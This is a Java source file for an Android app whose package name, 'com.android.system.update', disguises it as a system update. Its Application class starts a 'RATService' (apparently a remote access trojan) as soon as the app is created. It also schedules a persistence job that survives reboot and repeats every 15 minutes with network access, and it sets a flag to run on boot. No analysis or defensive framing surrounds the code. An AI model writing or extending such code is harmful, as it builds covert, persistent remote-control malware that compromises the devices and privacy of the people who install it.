package com.android.system.update;

import android.app.Application;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

public class AppController extends Application {
    private static final String TAG = "AppController";
    private static RATService connectionService;
    private static AppController instance;
    private static final int PERSISTENCE_JOB_ID = 1002;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        
        Log.d(TAG, "AppController created");
        
        // Start service on app creation
        startRATService();
        
        // Schedule jobs even from Application level
        schedulePersistenceJob();
        
        // Set that service should run on boot
        setRunOnBoot(true);
    }

    public static synchronized RATService getConnectionService() {
        return connectionService;
    }

    public static synchronized void setConnectionService(RATService service) {
        connectionService = service;
    }

    public static synchronized void clearConnectionService() {
        connectionService = null;
    }

    public static AppController getInstance() {
        return instance;
    }
    
    private void startRATService() {
        Intent serviceIntent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        Log.d(TAG, "RATService start requested");
    }
    
    private void schedulePersistenceJob() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
                JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
                        .setPeriodic(15 * 60 * 1000) // 15 minutes
                        .setPersisted(true) // Survives reboot
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .build();
                
                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
                int result = jobScheduler.schedule(jobInfo);
                
                if (result == JobScheduler.RESULT_SUCCESS) {
                    Log.d(TAG, "Persistence job scheduled from AppController");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error scheduling persistence job", e);
            }
        }
    }
    
    private void setRunOnBoot(boolean shouldRun) {
        SharedPreferences prefs = getSharedPreferences("service_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("should_run", shouldRun).apply();
    }
}
